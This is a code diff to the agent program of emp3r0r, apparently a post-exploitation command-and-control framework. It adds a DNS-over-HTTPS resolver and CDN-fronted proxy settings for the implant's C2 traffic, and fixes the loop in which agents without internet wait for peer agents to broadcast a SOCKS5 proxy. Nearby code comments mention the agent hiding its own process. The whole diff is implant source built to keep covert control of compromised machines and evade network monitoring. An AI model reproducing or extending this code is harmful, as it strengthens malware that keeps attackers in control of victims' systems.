@@ -18,6 +18,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
+	"github.com/ncruces/go-dns"
 )
 
 func main() {
@@ -128,23 +129,41 @@ func main() {
 		emp3r0r_data.AgentProxy = *c2proxy
 	}
 
+	// DNS
+	if *doh != "" {
+		emp3r0r_data.DoHServer = *doh
+	}
+	if emp3r0r_data.DoHServer != "" {
+		// use DoH resolver
+		net.DefaultResolver, err = dns.NewDoHResolver(
+			emp3r0r_data.DoHServer,
+			dns.DoHCache())
+		if err != nil {
+			log.Fatal(err)
+		}
+	}
+
 	// if user wants to use CDN proxy
 	if *cdnProxy != "" {
+		emp3r0r_data.CDNProxy = *cdnProxy
+	}
+	if emp3r0r_data.CDNProxy != "" {
 		go func() {
 			// DoH server
 			dns := "https://9.9.9.9/dns-query"
-			if *doh != "" {
-				dns = *doh
+			if emp3r0r_data.DoHServer != "" {
+				dns = emp3r0r_data.DoHServer
 			}
 
-			// you can change DoH server here if needed
-			err := cdn2proxy.StartProxy("127.0.0.1:10888", *cdnProxy, dns)
+			// typically you need to configure AgentProxy manually if agent doesn't have internet
+			// and AgentProxy will be used for websocket connection, then replaced with 10888
+			err := cdn2proxy.StartProxy("127.0.0.1:10888", emp3r0r_data.CDNProxy, emp3r0r_data.AgentProxy, dns)
 			if err != nil {
 				log.Fatal(err)
 			}
+			emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", emp3r0r_data.CDNProxy)
+			emp3r0r_data.AgentProxy = "socks5://127.0.0.1:10888"
 		}()
-		emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", *cdnProxy)
-		emp3r0r_data.AgentProxy = "socks5://127.0.0.1:10888"
 	}
 
 	// hide process of itself if possible
@@ -178,11 +197,10 @@ func main() {
 	}()
 
 	// do we have internet?
-	checkInternet := func(cnt int) bool {
-		defer func() { cnt++ }()
+	checkInternet := func(cnt *int) bool {
 		if tun.HasInternetAccess() {
 			// if we do, we are feeling helpful
-			if cnt == 0 {
+			if *cnt == 0 {
 				log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
 				ctx, cancel := context.WithCancel(context.Background())
 				go agent.StartBroadcast(true, ctx, cancel)
@@ -190,14 +208,16 @@ func main() {
 			return true
 
 		} else if !tun.IsTor(emp3r0r_data.CCAddress) && !tun.IsProxyOK(emp3r0r_data.AgentProxy) {
+			*cnt++
 			// we don't, just wait for some other agents to help us
 			log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
-			if cnt == 0 {
+			if *cnt == 0 {
 				ctx, cancel := context.WithCancel(context.Background())
 				go func() {
+					log.Printf("[%d] Starting broadcast server to receive proxy", *cnt)
 					err := agent.BroadcastServer(ctx, cancel, "")
 					if err != nil {
-						log.Fatal(err)
+						log.Fatalf("BroadcastServer: %v", err)
 					}
 				}()
 				for ctx.Err() == nil {
@@ -213,7 +233,7 @@ func main() {
 		return true
 	}
 	i := 0
-	for !checkInternet(i) {
+	for !checkInternet(&i) {
 		log.Printf("[%d] Checking Internet connectivity...", i)
 		time.Sleep(time.Duration(util.RandInt(3, 20)) * time.Second)
 	}
